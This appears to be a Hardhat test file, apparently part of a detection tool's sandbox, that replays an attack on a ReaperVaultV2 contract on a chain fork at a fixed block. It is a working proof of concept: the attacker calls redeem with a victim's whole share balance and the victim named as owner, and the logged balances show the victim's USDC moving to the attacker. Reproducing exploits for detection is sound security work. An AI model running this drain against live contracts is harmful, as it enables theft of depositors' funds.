import { ethers } from 'hardhat'
import { IReaperVaultV2, IERC20 } from '../typechain-types'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('CCA Detects Sandbox Attack Test', async function () {
    this.timeout(150000)
    let attacker: SignerWithAddress
    let victim: string
    let reaperVault: IReaperVaultV2
    let usdc: IERC20

    beforeEach(async () => {
        ;[attacker] = await ethers.getSigners()
        reaperVault = await ethers.getContractAt('IReaperVaultV2', '0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D')
        usdc = await ethers.getContractAt('IERC20', '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75')
    })

    it('should block number equal to 44045899', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(44045899)
    })

    it('should attacker abuse the ReaperVaultV2 contract', async function () {
        victim = await ethers.getAddress('0x59cb9F088806E511157A6c92B293E5574531022A')
        console.log('Attacker USDC balance', await usdc.balanceOf(attacker))
        let victimBalance = await reaperVault.balanceOf(victim)
        console.log('Victim ReaperUSDCVault balance', victimBalance)
        await reaperVault.connect(attacker).redeem(victimBalance, attacker.getAddress(), victim)
        console.log('Attacker USDC balance', await usdc.balanceOf(attacker.getAddress()))
        console.log('Victim ReaperUSDCVault balance', await reaperVault.balanceOf(victim))
    })
})
